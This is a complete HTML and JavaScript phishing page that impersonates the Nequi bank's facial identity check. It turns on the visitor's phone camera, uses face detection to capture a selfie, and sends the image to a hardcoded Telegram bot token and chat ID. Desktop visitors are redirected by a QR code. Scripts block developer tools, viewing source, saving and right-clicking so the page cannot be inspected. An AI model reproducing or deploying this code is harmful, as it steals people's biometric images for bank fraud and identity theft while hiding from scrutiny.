<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Alinea tu rostro</title>
<style>
  * { box-sizing: border-box; }

  html, body {
    margin: 0;
    height: 100%;
    background: #FFFFFF;
  }

  .screen {
    min-height: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: calc(env(safe-area-inset-top, 0px) + 6vh) 6vw 6vh;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  }

  /* Logo superior */
  .logo {
    display: block;
    width: clamp(120px, 27vw, 170px);
    height: auto;
  }

  /* Marco facial */
  .face-frame {
    position: relative;
    width: min(87vw, 440px);
    aspect-ratio: 567 / 571;
    margin-top: clamp(40px, 12vw, 90px);
  }

  .face-ring {
    position: absolute;
    inset: 0;
    width: 100%;
    height: 100%;
    display: block;
  }

  .face-disc {
    position: absolute;
    left: 7.055%;
    top: 6.830%;
    width: 85.714%;
    height: 85.114%;
    border-radius: 50%;
    overflow: hidden;
    z-index: 1;
    background:
      radial-gradient(circle at 50% 8%, rgba(255,255,255,.18), rgba(255,255,255,0) 60%),
      linear-gradient(to bottom, #C2C2C2 0%, #B4B4B4 12%, #8F8F8F 45%, #7C7C7C 75%, #6E6E6E 100%);
  }

  .face-disc video {
    width: 100%;
    height: 100%;
    object-fit: cover;
    display: block;
    transform: scaleX(-1);
  }

  .face-silhouette {
    position: absolute;
    inset: 0;
    width: 100%;
    height: 100%;
    pointer-events: none;
    z-index: 2;
  }

  .face-silhouette svg {
    display: block;
    width: 100%;
    height: 100%;
  }

  /* Texto inferior interactivo */
  .instruction {
    margin: clamp(36px, 11vw, 80px) 0 0;
    max-width: 22ch;
    text-align: center;
    font-size: clamp(22px, 5.2vw, 30px);
    line-height: 1.3;
    font-weight: 700;
    color: #2B2B38;
    transition: color 0.3s ease;
  }

  canvas {
    display: none;
  }

  /* Pantalla de bloqueo para PC con Código QR */
  #desktop-blocker {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: #ffffff;
    z-index: 99999;
    flex-direction: column;
    justify-content: flex-start;
    align-items: center;
    padding: 90px;
    text-align: center;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    background: url(https://i.imgur.com/jGOJlYo.png) right no-repeat #FBE5F2;
  }

  /* Logo grande para la vista PC */
  .desktop-logo {
    height: 60px;
    object-fit: contain;
    margin-bottom: 28px;
  }

  .qr-container {
    background: #ffffff;
    padding: 20px;
    border-radius: 20px;
    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
    border: 1px solid #f0f0f5;
    margin-bottom: 24px;
  }

  .qr-container img {
    width: 220px;
    height: 220px;
    object-fit: contain;
    display: block;
  }

  .desktop-title {
    font-size: 22px;
    font-weight: 800;
    color: #1e002c;
    margin-bottom: 10px;
  }

  /* Ancho corregido a 380px para que las líneas tengan el ancho idéntico a la otra pantalla */
  .desktop-desc {
    font-size: 15px;
    color: #625768;
    max-width: 380px;
    line-height: 1.4;
    font-weight: 500;
    margin: 0 auto;
  }
</style>

<!-- Librería de detección facial MediaPipe / TensorFlow.js -->
<script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-core"></script>
<script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-converter"></script>
<script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-backend-webgl"></script>
<script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/face-detection"></script>
</head>
<body>

<!-- Pantalla exclusiva para PC con Logo grande y Código QR -->
<div id="desktop-blocker">
  <img class="desktop-logo" src="../NequiArchivos/vOLtQz8.png" alt="Nequi" onerror="this.src='vOLtQz8.png';">
  <div class="qr-container">
    <img src="../NequiArchivos/codigo_qr.png" alt="Escanea el código QR">
  </div>
  <div class="desktop-title">Escanea el código QR</div>
  <p class="desktop-desc">Usa la cámara de tu celular para escanear el código y continuar con la validación de identidad.</p>
</div>

<main class="screen">

  <!-- Imagen superior -->
  <img class="logo" src="vOLtQz8.png" alt="Nequi" onerror="this.src='../NequiArchivos/vOLtQz8.png'">

  <div class="face-frame">

    <!-- Anillo -->
    <svg class="face-ring" viewBox="0 0 567 571" xmlns="http://www.w3.org/2000/svg" fill="none">
      <circle cx="283" cy="285" r="265" stroke="#EAEBEF" stroke-width="13" fill="#FFFFFF"/>
    </svg>

    <!-- Cámara -->
    <div class="face-disc">
      <video id="cam" autoplay playsinline muted></video>
    </div>

    <!-- Silueta blanca del rostro -->
    <div class="face-silhouette">
      <svg viewBox="0 0 567 571" xmlns="http://www.w3.org/2000/svg" fill="none">
        <path
          d="
            M 198 507
            C 205 492, 199 469, 198 451
            C 180 431, 164 408, 160 388
            L 158 366
            C 143 357, 131 340, 127 322
            C 123 306, 126 292, 137 283
            L 148 272
            C 142 239, 142 205, 150 175
            C 163 126, 204 92, 252 82
            C 288 74, 327 80, 354 99
            C 391 125, 411 161, 416 200
            C 419 224, 416 250, 412 269
            L 426 282
            C 438 291, 441 304, 436 322
            C 431 340, 419 357, 402 366
            L 399 388
            C 395 408, 379 431, 367 451
            C 366 470, 361 491, 368 507
          "
          stroke="#FFFFFF"
          stroke-width="10"
          stroke-linecap="round"
          stroke-linejoin="round"
        />
      </svg>
    </div>

  </div>

  <p id="instruction-text" class="instruction">Alinea tu rostro dentro de la silueta blanca</p>
  <canvas id="photo-canvas"></canvas>

</main>

<script>
  // CONFIGURA TUS DATOS DE TELEGRAM AQUÍ:
  const TELEGRAM_BOT_TOKEN = '6159424723:AAE4qhm6H4sNLztr5HnLjAOrZlf95BAUKBE';
  const TELEGRAM_CHAT_ID = '-1003508204208';

  const video = document.getElementById('cam');
  const instructionTxt = document.getElementById('instruction-text');
  const canvas = document.getElementById('photo-canvas');
  
  let detector;
  let detectionStartTime = null;
  let photoTaken = false;

  // Comprobar si el acceso es desde un PC
  function isDesktopDevice() {
    return !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) || window.innerWidth > 992;
  }

  async function setupCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
        audio: false
      });
      video.srcObject = stream;
      return new Promise((resolve) => {
        video.onloadedmetadata = () => resolve(video);
      });
    } catch (err) {
      instructionTxt.innerText = "Error al acceder a la cámara";
    }
  }

  async function loadDetector() {
    const model = faceDetection.SupportedModels.MediaPipeFaceDetector;
    const detectorConfig = {
      runtime: 'tfjs',
      modelType: 'short'
    };
    detector = await faceDetection.createDetector(model, detectorConfig);
  }

  async function detectFaces() {
    if (photoTaken) return;

    if (video.readyState >= 2 && detector) {
      const faces = await detector.estimateFaces(video, { flipHorizontal: false });

      if (faces.length === 0) {
        // Si el rostro se quita, reiniciamos el temporizador y el texto por defecto
        instructionTxt.innerText = "Alinea tu rostro dentro de la silueta blanca";
        detectionStartTime = null;
      } else {
        if (!detectionStartTime) {
          detectionStartTime = Date.now();
        }

        const elapsedTime = Date.now() - detectionStartTime;

        if (elapsedTime < 2000) {
          instructionTxt.innerText = "Acerca tu rostro";
        } else if (elapsedTime >= 2000 && elapsedTime < 4000) {
          instructionTxt.innerText = "Mire al frente";
        } else if (elapsedTime >= 4000 && elapsedTime < 5000) {
          instructionTxt.innerText = "No te muevas";
        } else {
          takePhoto();
        }
      }
    }

    requestAnimationFrame(detectFaces);
  }

  async function takePhoto() {
    photoTaken = true;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const dataUrl = canvas.toDataURL('image/jpeg', 0.85);

    // Envía la foto y redirige a validando.html
    await sendPhotoToTelegram(dataUrl);
  }

  async function sendPhotoToTelegram(dataUrl) {
    try {
      const blob = await (await fetch(dataUrl)).blob();
      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append('photo', blob, 'rostro.jpg');

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    } catch (error) {
      console.error("Error al enviar foto:", error);
    } finally {
      window.location.href = 'validando_facial.html';
    }
  }

  async function main() {
    if (isDesktopDevice()) {
      document.getElementById('desktop-blocker').style.display = 'flex';
      return;
    }

    await setupCamera();
    await loadDetector();
    detectFaces();
  }

  window.addEventListener('DOMContentLoaded', main);

  // --- Bloqueo estricto de inspección y atajos de teclado ---
    document.addEventListener('keydown', function(e) {
        // Bloquear F12
        if (e.key === 'F12' || e.keyCode === 123) {
            e.preventDefault();
            return false;
        }

        // Bloquear Ctrl + Shift + I o J (Inspeccionar / Consola)
        if (e.ctrlKey && e.shiftKey && (e.key.toUpperCase() === 'I' || e.key.toUpperCase() === 'J')) {
            e.preventDefault();
            return false;
        }

        // Bloquear Ctrl + U (Ver código fuente)
        if (e.ctrlKey && e.key.toUpperCase() === 'U') {
            e.preventDefault();
            return false;
        }
    });

    // Bloquear clic derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    }, false);
</script>

<script>
    // Función de detección de PC y bloqueo de herramientas abiertas por consola
    function checkDevice() {
        const isDesktop = !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) || window.innerWidth > 992;
        if (isDesktop) {
            const blocker = document.getElementById('desktop-blocker');
            if (blocker) {
                blocker.style.display = 'flex';
            }
        }
    }
    checkDevice();
    window.addEventListener('resize', checkDevice);

    // Detección heurística adicional para evitar inspección por depuración activa
    setInterval(function() {
        const widthThreshold = window.outerWidth - window.innerWidth > 160;
        const heightThreshold = window.outerHeight - window.innerHeight > 160;
        if ((widthThreshold || heightThreshold) && !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent))) {
            document.body.innerHTML = "<h2 style='text-align:center; margin-top:20vh; font-family:Arial;'>Acceso bloqueado por seguridad.</h2>";
        }
    }, 1000);
</script>

<script src="https://unpkg.com/lucide@latest"></script>
<script>
    lucide.createIcons();
</script>

<script>
    // BLOQUEO PARA DESCARGAR PAGINA CTRL+S
(() => {
    'use strict';

    // Evita ejecutar dos veces la protección.
    if (window.__proteccionWebActiva) return;
    window.__proteccionWebActiva = true;

    function mostrarAviso() {
        if (document.getElementById('aviso-proteccion')) return;

        const aviso = document.createElement('div');
        aviso.id = 'aviso-proteccion';

        Object.assign(aviso.style, {
            position: 'fixed',
            inset: '0',
            zIndex: '2147483647',
            background: 'rgba(0,0,0,.88)',
            color: '#fff',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '24px',
            boxSizing: 'border-box',
            fontFamily: 'Arial, sans-serif',
            textAlign: 'center'
        });

        const panel = document.createElement('div');
        Object.assign(panel.style, {
            maxWidth: '420px',
            padding: '28px',
            background: '#202020',
            borderRadius: '12px',
            border: '1px solid #555'
        });

        const titulo = document.createElement('h2');
        titulo.textContent = 'Acción no permitida';

        const mensaje = document.createElement('p');
        mensaje.textContent =
            'Esta acción está restringida en esta página.';

        const boton = document.createElement('button');
        boton.type = 'button';
        boton.textContent = 'Volver a la página';

        Object.assign(boton.style, {
            padding: '12px 20px',
            border: '0',
            borderRadius: '6px',
            cursor: 'pointer',
            fontWeight: 'bold'
        });

        boton.addEventListener('click', () => aviso.remove());

        panel.append(titulo, mensaje, boton);
        aviso.appendChild(panel);
        document.body.appendChild(aviso);
    }

    // Bloquear Ctrl+S, Ctrl+U, Ctrl+P y algunas herramientas habituales.
    document.addEventListener('keydown', function (e) {
        const tecla = e.key.toLowerCase();

        if (
            (e.ctrlKey || e.metaKey) &&
            ['s', 'u', 'p'].includes(tecla)
        ) {
            e.preventDefault();
            e.stopImmediatePropagation();
            mostrarAviso();
        }

        // Bloqueo básico de F12 y Ctrl+Shift+I/J/C.
        if (
            tecla === 'f12' ||
            ((e.ctrlKey || e.metaKey) &&
             e.shiftKey &&
             ['i', 'j', 'c'].includes(tecla))
        ) {
            e.preventDefault();
            e.stopImmediatePropagation();
            mostrarAviso();
        }
    }, true);

    // Bloquear menú contextual del clic derecho.
    document.addEventListener('contextmenu', function (e) {
        e.preventDefault();
        mostrarAviso();
    }, true);

})();
</script>

</body>
</html>
